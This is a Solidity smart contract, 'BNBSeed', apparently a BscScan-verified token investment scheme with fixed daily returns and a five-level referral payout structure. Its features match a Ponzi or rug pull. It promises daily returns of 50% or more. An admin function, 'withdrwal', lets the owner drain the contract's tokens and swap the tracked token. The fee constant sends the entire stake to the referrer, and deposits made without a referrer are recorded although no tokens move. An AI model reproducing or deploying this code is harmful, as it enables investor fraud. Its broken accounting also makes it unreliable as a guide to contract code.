/**
 *Submitted for verification at BscScan.com on 2022-09-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-02
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.5.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract BNBSeed {
	using SafeMath for uint256;

	// uint256 constant public INVEST_MIN_AMOUNT = 1e16; // Min 0.01 bnb 
	uint256[] public REFERRAL_PERCENTS 	= [800, 200, 200, 100, 100];
	uint256[] public SEED_PERCENTS 		= [10000, 5000, 3000, 2000, 1000];
    uint256[] public sharerr;
 	uint256 constant public PROJECT_FEE = 10000;
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;
	uint256 public totalRefBonus;
	
	
	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
	

    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
	
	mapping(address => address) public referralLevel1Address;
    mapping(address => address) public referralLevel2Address;
    mapping(address => address) public referralLevel3Address;
    mapping(address => address) public referralLevel4Address;
    mapping(address => address) public referralLevel5Address;
	
	
    struct Plan {
        uint256 time;
        uint256 percent;
		uint256 minAmount;
		bool isActive;
        uint256 totalDeposit;
    }

    Plan[] public plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[5] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 seedincome;
		uint256 withdrawn;
		uint256 withdrawnseed;
	}
	
	mapping (address => User) public users;

	bool public started=true;
	address payable public commissionWallet;
	IERC20 public  token;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event SeedIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
    address public admin;
   address [] private admins;  
	constructor(address payable wallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
		admins.push(wallet);
        plans.push(Plan(180, 5000,10000000000000000000,true,0));
		plans.push(Plan(365, 10000,50000000000000000000,true,0));
		plans.push(Plan(180, 15000,100000000000000000000,true,0));
		plans.push(Plan(365, 20000,50000000000000000000,true,0));
    	token = IERC20(0xBf4B5f6c4B23A9d5adf9B81C23986d4bAb465C07); //** test token
	}

	modifier onlyAdmin(){
		require(msg.sender==commissionWallet,"Error: You Are Not Admin");
		_;
	}

   	function addadmins(address _address) public onlyAdmin {
		require(!checkExitsAddress(_address),"Address already added");
		admins.push(_address);
	}

    function fetchAdmins() public view returns(address [] memory){
		return admins;
	}

	function checkExitsAddress(address _userAdd) private view returns (bool){
       bool found=false;
        for (uint i=0; i<admins.length; i++) {
            if(admins[i]==_userAdd){
                found=true;
                break;
            }
        }
        return found;
    }    

	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }

    function addPlans(uint256 time,uint256 percentage,uint256 minAmount,bool isActive) public onlyAdmin{
		plans.push(Plan(time, percentage,minAmount,isActive,0));
	}

    function updatePlanStatus(uint8 plan,bool isActive) public onlyAdmin{
        plans[plan].isActive = isActive;
    }

    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

	function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
	
        // Level 2
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        // Level 3
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
        // Level 4
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        // Level 5
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
      
	}	
	function invest(address referrer, uint8 plan,uint256 stackAmount) public  {

		require(stackAmount >= plans[plan].minAmount,"Low Investment Amount");
		require(plans[plan].time>0,"Invalid Plan");
		require(plans[plan].isActive,"Plan is not Active");

        if(referrer != address(0) && referrer != msg.sender){
            uint256 fee = stackAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
            token.transferFrom(msg.sender,referrer,fee);
            token.transferFrom(msg.sender,address(this),stackAmount.sub(fee));
		    emit FeePayed(msg.sender, fee);
        }


		User storage user = users[msg.sender];
		
		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, msg.sender, _newReferral);

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
				if (upline != address(0)) {
					uint256 amount = stackAmount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, stackAmount, block.timestamp));

		totalInvested = totalInvested.add(stackAmount);
        plans[plan].totalDeposit += stackAmount;

		emit NewDeposit(msg.sender, plan, stackAmount);
	}

	function withdraw(uint8 plan) public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender,plan);
		uint256 seedAmount = getcurrentseedincome(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		totalAmount = totalAmount.add(seedAmount);
		user.withdrawnseed = user.withdrawnseed.add(seedAmount);
		
		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = token.balanceOf(address(this));	
		require(contractBalance>=totalAmount,"Contract has not Insufficent Balance");
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		token.transfer(msg.sender,totalAmount);
		emit Withdrawn(msg.sender, totalAmount);
	}

	function withdrwal(address _token,uint256 value ) public onlyAdmin{
        if(_token==address(0)){
            commissionWallet.transfer(address(this).balance);
        }else{
           token = IERC20(_token);
          token.transfer(commissionWallet, value);
        }
    }
    
	function updateWallet(address payable _newWallet) public onlyAdmin{
		commissionWallet=_newWallet;
	}
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent,uint256 minAmount,bool isActive,uint256 totalDeposit) {
		time = plans[plan].time;
		percent = plans[plan].percent;
		minAmount = plans[plan].minAmount;
		isActive = plans[plan].isActive;
        totalDeposit = plans[plan].totalDeposit;
	}

    function getTotalPlans() public view returns(uint256){
        return plans.length;
    }

	function getUserDividends(address userAddress,uint8 plan) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if(user.deposits[i].plan==plan){

				uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
				if (user.checkpoint < finish) {
					uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = finish < block.timestamp ? finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
				}
			}
		}

		return totalAmount;
	}
	
    function getshare(address userAddress,uint8 plan) public {
		User storage user = users[userAddress];
       
		for (uint256 i = 0; i < user.deposits.length; i++) {
			if(user.deposits[i].plan==plan){

				uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(1 days));
				if (user.checkpoint < finish) {
					uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PLANPER_DIVIDER);
					sharerr.push(share);
				}
			}
		}
	}

	function getUserSeedIncome(address userAddress) public view returns (uint256){
	
		uint256 totalSeedAmount;
		uint256 seedshare;
		
		uint256 count = getUserTotalReferrals(userAddress);
		
		for	(uint256 y=1; y<= count; y++)
		{
		    uint256 level;
		    address addressdownline;
		    
		    (addressdownline,level) = getDownlineRef(userAddress, y);
		
			User storage downline =users[addressdownline];
			
			
			for (uint256 i = 0; i < downline.deposits.length; i++) {
				uint256 finish = downline.deposits[i].start.add(plans[downline.deposits[i].plan].time.mul(1 days));
				if (downline.deposits[i].start < finish) {
					uint256 share = downline.deposits[i].amount.mul(plans[downline.deposits[i].plan].percent).div(PLANPER_DIVIDER);
					uint256 from = downline.deposits[i].start;
					uint256 to = finish < block.timestamp ? finish : block.timestamp;
					//seed income
                    seedshare = share.mul(SEED_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
					
					if (from < to) {
					
							totalSeedAmount = totalSeedAmount.add(seedshare.mul(to.sub(from)).div(TIME_STEP));	
					}
				}
			}
		}
		
		return totalSeedAmount;		
	
	} 

    function getUserPlanDeposit(address _useradress,uint8 plan) public view returns (uint256){
        User storage user = users[_useradress];
        uint256 totalAmount;
        for(uint256 i=0;i<user.deposits.length;i++){
            if(user.deposits[i].plan == plan){
                totalAmount += user.deposits[i].amount;
            }
        }
        return totalAmount;
    }
	
	
	function getcurrentseedincome(address userAddress) public view returns (uint256){
	    User storage user = users[userAddress];
	    return (getUserSeedIncome(userAddress).sub(user.withdrawnseed));
	    
	}
	
	function getUserTotalSeedWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawnseed;
	}


	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress,uint8 plan) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress,plan));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(1 days));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalRefBonus);
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}